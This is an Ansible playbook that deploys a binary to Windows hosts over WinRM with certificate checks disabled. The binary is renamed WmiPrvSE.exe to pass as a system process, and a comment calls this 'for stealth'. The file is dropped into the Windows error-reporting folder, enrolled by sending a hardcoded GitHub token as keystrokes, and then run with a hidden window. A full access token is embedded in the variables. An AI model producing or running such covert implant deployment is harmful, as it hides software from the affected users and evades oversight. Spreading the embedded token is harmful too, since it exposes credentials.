---
- name: Deploy and Enroll System Management Service
  hosts: windows_targets
  gather_facts: no
  vars:
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
    
    target_dir: 'C:\ProgramData\Microsoft\Windows\WER'
    state_file: '{{ target_dir }}\state.json'
    
    # PUT YOUR GITHUB TOKEN HERE
    github_token: "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"

  tasks:
    - name: Ensure target directory exists
      ansible.windows.win_file:
        path: "{{ target_dir }}"
        state: directory

    - name: Drop the binary (renamed for stealth)
      ansible.windows.win_copy:
        src: "files/proper.exe"
        dest: "{{ target_dir }}\\WmiPrvSE.exe"

    - name: Check if the agent is already enrolled
      ansible.windows.win_stat:
        path: "{{ state_file }}"
      register: state_check

    # --- AUTO-ENROLL: FORCE A REAL CONSOLE AND SEND KEYSTROKES ---
    - name: Launch agent and automatically pass the GitHub token
      ansible.windows.win_shell: |
        $wshell = New-Object -ComObject wscript.shell
        
        # Start the process in a real console window (hidden off-screen to not disturb the user)
        # The Go binary will see this as a real TTY and allow the token prompt
        $proc = Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "setup" -WindowStyle Minimized -PassThru
        
        # Wait for the binary to initialize and print the prompt
        Start-Sleep -Seconds 2
        
        # Bring the window to the foreground and send the token
        $wshell.AppActivate($proc.Id) | Out-Null
        Start-Sleep -Milliseconds 500
        $wshell.SendKeys("{{ github_token }}")
        Start-Sleep -Milliseconds 500
        $wshell.SendKeys("{ENTER}")
        
        # Wait for enrollment to finish
        $proc.WaitForExit()
      when: not state_check.stat.exists

    # --- LAUNCH HIDDEN IN BACKGROUND ---
    - name: Launch agent hidden in the background
      ansible.windows.win_shell: |
        Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
      when: state_check.stat.exists or not state_check.stat.exists
